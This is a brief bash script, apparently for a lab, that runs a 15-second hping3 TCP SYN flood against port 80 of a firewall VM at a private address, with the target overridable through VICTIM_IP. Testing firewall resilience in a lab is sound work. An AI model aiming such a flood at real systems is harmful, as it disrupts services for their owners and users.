#!/usr/bin/env bash
set -euo pipefail

VICTIM_IP="${VICTIM_IP:-192.168.56.10}"
echo "Target firewall VM: ${VICTIM_IP} (override with VICTIM_IP=<ip>)"

timeout 15 hping3 -S -p 80 -i u1000 "${VICTIM_IP}"
